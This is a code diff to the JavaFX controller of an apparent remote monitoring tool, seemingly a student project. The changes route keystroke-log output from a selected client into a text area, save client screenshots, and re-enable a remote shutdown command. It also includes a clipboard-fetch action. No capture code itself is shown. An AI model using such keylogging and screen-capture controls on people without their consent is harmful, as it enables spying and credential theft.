@@ -66,7 +66,8 @@ public class HelloController implements Initializable {
     public TextArea Ramlabel;
     public Tab CpuPane;
     public PieChart CPUChart;
-//    public TextArea CPUText;
+    public TextArea keyLogerLabel;
+    //    public TextArea CPUText;
     @FXML
     private Label welcomeText;
     public static ObservableList<String> listClient;
@@ -78,7 +79,7 @@ public class HelloController implements Initializable {
     protected void onHelloButtonClick() {
         try {
             String input = table.getSelectionModel().getSelectedItem();
-            if(input==null){
+            if(input==null||!input.contains("client")){
                 return;
             }
             Message object = new Message();
@@ -94,8 +95,8 @@ public class HelloController implements Initializable {
                 int h = image.getHeight();
                 int w = image.getWidth();
                 image = resize(image, h / 2, w / 2);
-                ImageIO.write(image, "png", new File("src/main/resources/Shot.png"));
-                Image imageShow = new Image("Shot.png");
+                ImageIO.write(image, "png", new File("D:/shot.png"));
+                Image imageShow = new Image("D:/shot.png");
                 ImageView imageView = new ImageView(imageShow);
                 Alert alert = new Alert(Alert.AlertType.INFORMATION);
                 alert.setHeaderText("");
@@ -285,19 +286,19 @@ public class HelloController implements Initializable {
         }
     }
     public void shutDownUser() {
-//        String index = table.getSelectionModel().getSelectedItem();
-//        if(index == null||!index.contains("client")){
-//            return;
-//        }
-//        Message object = new Message();
-//        object.command = Message.SHUT_DOWN;
-//        object.data = "";
-//        object.toId = index;
-//        try {
-//            Client.dos.writeObject(object);
-//        } catch (IOException e) {
-//            System.err.println("Lỗi ghê á LogOutUser");
-//        }
+        String index = table.getSelectionModel().getSelectedItem();
+        if(index == null||!index.contains("client")){
+            return;
+        }
+        Message object = new Message();
+        object.command = Message.SHUT_DOWN;
+        object.data = "";
+        object.toId = index;
+        try {
+            Client.dos.writeObject(object);
+        } catch (IOException e) {
+            System.err.println("Lỗi ghê á LogOutUser");
+        }
     }
 
     public void getClipBoardAction() {
@@ -485,18 +486,10 @@ public class HelloController implements Initializable {
             Client.dos.writeObject(object);
             Message msg = (Message) Client.dis.readObject();
             if(msg.data.equals("error")){
-                Alert alert = new Alert(Alert.AlertType.INFORMATION);
-                alert.setHeaderText("");
-                alert.setContentText("Người dùng đã bị ngắt kết nối");
-                alert.setTitle("Nội dung ghi phím");
-                alert.showAndWait();
+                keyLogerLabel.setText("Người dùng đã ngắt kết nối");
                 return;
             }
-            Alert alert = new Alert(Alert.AlertType.INFORMATION);
-            alert.setHeaderText("");
-            alert.setContentText(msg.data);
-            alert.setTitle("Nội dung ghi phím");
-            alert.showAndWait();
+            keyLogerLabel.setText(msg.data);
         } catch (IOException | ClassNotFoundException e) {
             System.err.println("Lỗi ghê á ghi phím");
         }
